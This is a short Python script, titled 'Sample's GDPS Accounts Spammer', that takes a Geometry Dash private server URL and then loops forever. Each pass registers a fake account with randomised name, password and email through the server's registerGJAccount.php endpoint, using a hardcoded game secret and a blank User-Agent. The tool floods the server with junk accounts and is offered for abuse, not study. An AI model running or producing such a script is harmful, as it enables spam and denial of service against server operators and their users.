import requests
import random

def createAcc(userName, email):
    endpoint = database
    rstr = str(random.randint(1111111, 9999999))
    data = {
        'userName': userName+rstr, 
        'password': rstr, 
        'email': rstr+email, 
        'secret': 'Wmfv3899gc9'
    }
    headers = {'User-Agent': ''}
    r = requests.post(endpoint+"accounts/registerGJAccount.php", data=data, headers=headers)
    return r.text
    
print("Sample's GDPS Accounts Spammer") 
database = input("database url (for example: http://ps.fhgdps.com/Geometrykras/): ")
userName = input("custom username before numbers: ")
email = input("custom email after numbers: ")

while True:
    print(createAcc(userName, email))
    
